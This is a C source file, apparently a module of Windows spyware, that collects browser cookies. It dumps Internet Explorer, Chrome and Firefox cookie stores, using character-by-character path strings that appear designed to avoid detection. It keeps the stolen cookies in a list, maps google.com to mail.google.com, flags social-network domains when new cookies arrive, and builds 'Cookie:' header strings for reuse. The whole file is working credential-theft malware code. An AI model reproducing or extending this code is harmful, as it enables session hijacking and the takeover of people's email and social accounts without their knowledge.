#include <Windows.h>
#include <stdio.h>

#include "debug.h"
#include "zmem.h"
#include "social.h"
#include "cookies.h"
#include "ie_cookies.h"
#include "firefox_cookies.h"
#include "chrome_cookies.h"

DWORD dwCookieCount;
LPCOOKIE_LIST lpCookieList = NULL;

#define COOKIE_MIN_LEN 32
LPSTR GetCookieString(__in LPWSTR strDomain)
{
	LPSTR strCookieString = NULL;
	DWORD dwLength = COOKIE_MIN_LEN;
	
	LPSTR strDomainA = (LPSTR) zalloc((wcslen(strDomain)+1) * sizeof(WCHAR));
	_snprintf_s(strDomainA, (wcslen(strDomain)+1)*sizeof(WCHAR), _TRUNCATE, "%S", strDomain);

	for (DWORD i=0; i<dwCookieCount; i++)
	{
		if (lpCookieList[i].strDomain && !strcmp(lpCookieList[i].strDomain, strDomainA) && lpCookieList[i].strValue && lpCookieList[i].strName)
		{
			dwLength += strlen(lpCookieList[i].strName);
			dwLength += strlen(lpCookieList[i].strValue);
			dwLength += 3;
		}
	}

	if (dwLength != COOKIE_MIN_LEN)
	{
		strCookieString = (LPSTR) zalloc(dwLength);
		sprintf_s(strCookieString, dwLength, "Cookie:");  //FIXME: array

		for (DWORD i=0; i<dwCookieCount; i++)
		{
			if (lpCookieList[i].strDomain && !strcmp(lpCookieList[i].strDomain, strDomainA) && lpCookieList[i].strValue && lpCookieList[i].strName)
			{
				strcat_s(strCookieString, dwLength, " ");
				strcat_s(strCookieString, dwLength, lpCookieList[i].strName);
				strcat_s(strCookieString, dwLength, "=");
				strcat_s(strCookieString, dwLength, lpCookieList[i].strValue);
				strcat_s(strCookieString, dwLength, ";");
			}
		}
	}

	zfree(strDomainA);
	return strCookieString;
}

VOID NotifyNewCookie(LPSTR strDomain)
{
	WCHAR strDomainW[1024];
	_snwprintf_s(strDomainW, 1024, _TRUNCATE, L"%S", strDomain);

	for (DWORD i=0; i<SOCIAL_ENTRY_COUNT; i++)
		if (!wcscmp(strDomainW, pSocialEntry[i].strDomain))
			pSocialEntry[i].bNewCookie = TRUE;
}

BOOL AddCookieW(__in LPWSTR strDomainW, __in LPWSTR strNameW, __in LPWSTR strValueW)
{
	LPSTR strDomainA, strNameA, strValueA;

	DWORD dwSize = (wcslen(strDomainW)+1)*sizeof(WCHAR);
	strDomainA = (LPSTR) zalloc(dwSize);
	_snprintf_s(strDomainA, dwSize, _TRUNCATE, "%S", strDomainW);

	dwSize = (wcslen(strNameW)+1)*sizeof(WCHAR);
	strNameA = (LPSTR) zalloc(dwSize);
	_snprintf_s(strNameA, dwSize, _TRUNCATE, "%S", strNameW);

	dwSize = (wcslen(strValueW)+1)*sizeof(WCHAR);
	strValueA = (LPSTR) zalloc(dwSize);
	_snprintf_s(strValueA, dwSize, _TRUNCATE, "%S", strValueW);

	BOOL bRet = AddCookieA(strDomainA, strNameA, strValueA);

	zfree(strDomainA);
	zfree(strNameA);
	zfree(strValueA);
	return bRet;
}

BOOL AddCookieA(__in LPSTR strDomainTmp, __in LPSTR strName, __in LPSTR strValue)
{
	if (strName[0] == '_')
		return FALSE;

	CHAR strDomain[2048];
	if (!_stricmp("google.com", strDomainTmp))
		_snprintf_s(strDomain, 2047, _TRUNCATE, "mail.google.com");
	else
		_snprintf_s(strDomain, 2047, _TRUNCATE, strDomainTmp);

#ifdef _DEBUG
	OutputDebug(L"[*] Adding cookie for host:%S  %S=%S\n", strDomain, strName, strValue);
#endif

	for (DWORD i=0; i<dwCookieCount; i++)
	{
		if (lpCookieList[i].strDomain && lpCookieList[i].strName && !_stricmp(lpCookieList[i].strDomain, strDomain) && !_stricmp(lpCookieList[i].strName, strName))
		{
			if (lpCookieList[i].strValue && !_stricmp(lpCookieList[i].strValue, strValue))
			{
#ifdef _DEBUG
				//OutputDebug(L"[*] Skipping known cookie for %S => %S=%S\n", strDomain, strName, strValue);
#endif
				return FALSE; // already have it
			}

			zfree(lpCookieList[i].strValue);
			lpCookieList[i].strValue = _strdup(strValue);
//#ifdef _DEBUG
//			OutputDebug(L"[*] Updating cookie for %S => %S=%S, cookies: %d\n", strDomain, strName, strValue, dwCookieCount);
//#endif
			NotifyNewCookie(strDomain);
			return TRUE;
		}
	}

	LPCOOKIE_LIST lpTemp = (LPCOOKIE_LIST) realloc(lpCookieList, (dwCookieCount + 1) * sizeof(COOKIE_LIST));
	if (lpTemp == NULL)
		return FALSE;

	lpCookieList = lpTemp;
	lpCookieList[dwCookieCount].strDomain = _strdup(strDomain);
	lpCookieList[dwCookieCount].strName = _strdup(strName);
	lpCookieList[dwCookieCount].strValue = _strdup(strValue);
	dwCookieCount++;

//#ifdef _DEBUG
//	OutputDebug(L"[*] Adding cookie for %S => %S=%S, cookies: %d\n", strDomain, strName, strValue, dwCookieCount);
//#endif
	NotifyNewCookie(strDomain);

	return TRUE;
}

VOID DumpCookies()
{
	// reset cookies
	WCHAR strCookie[] = { L'M', L'i', L'c', L'r', L'o', L's', L'o', L'f', L't', L'\\', L'W', L'i', L'n', L'd', L'o', L'w', L's', L'\\', L'C', L'o', L'o', L'k', L'i', L'e', L's', L'\0' };
	WCHAR strCookieLow[] = { L'M', L'i', L'c', L'r', L'o', L's', L'o', L'f', L't', L'\\', L'W', L'i', L'n', L'd', L'o', L'w', L's', L'\\', L'C', L'o', L'o', L'k', L'i', L'e', L's', L'\\', L'L', L'o', L'w', L'\0'  };
	WCHAR strICookie[] = { L'M', L'i', L'c', L'r', L'o', L's', L'o', L'f', L't', L'\\', L'W', L'i', L'n', L'd', L'o', L'w', L's', L'\\', L'I', L'n', L'e', L't', L'C', L'o', L'o', L'k', L'i', L'e', L's', L'\0'  };
	WCHAR strICookieLow[] = { L'M', L'i', L'c', L'r', L'o', L's', L'o', L'f', L't', L'\\', L'W', L'i', L'n', L'd', L'o', L'w', L's', L'\\', L'I', L'n', L'e', L't', L'C', L'o', L'o', L'k', L'i', L'e', L's', L'\\', L'L', L'o', L'w', L'\0' };

	DumpIECookies(strCookie, FALSE);  //FIXME: array
	DumpIECookies(strCookieLow, FALSE);  //FIXME: array
	
	DumpIECookies(strICookie, TRUE);  //FIXME: array
	DumpIECookies(strICookieLow, TRUE);  //FIXME: array


	DumpChromeCookies();
	DumpFirefoxCookies();
}

VOID NormalizeDomainW(__in LPWSTR strDomain)
{
	LPWSTR strSrc, strDst;

	if (!strDomain)
		return;

	strSrc = strDst = strDomain;
	for(; *strSrc=='.'; strSrc++);

	for (;;) {
		if (*strSrc == '/' || *strSrc==NULL)
			break;

		*strDst = *strSrc;
		strDst++;
		strSrc++;
	}

	*strDst = NULL;
}

VOID NormalizeDomainA(__in LPSTR strDomain)
{
	LPSTR strSrc, strDst;

	if (!strDomain)
		return;

	strSrc = strDst = strDomain;
	for(; *strSrc=='.'; strSrc++);

	for (;;) {
		if (*strSrc == '/' || *strSrc==NULL)
			break;

		*strDst = *strSrc;
		strDst++;
		strSrc++;
	}

	*strDst = NULL;
}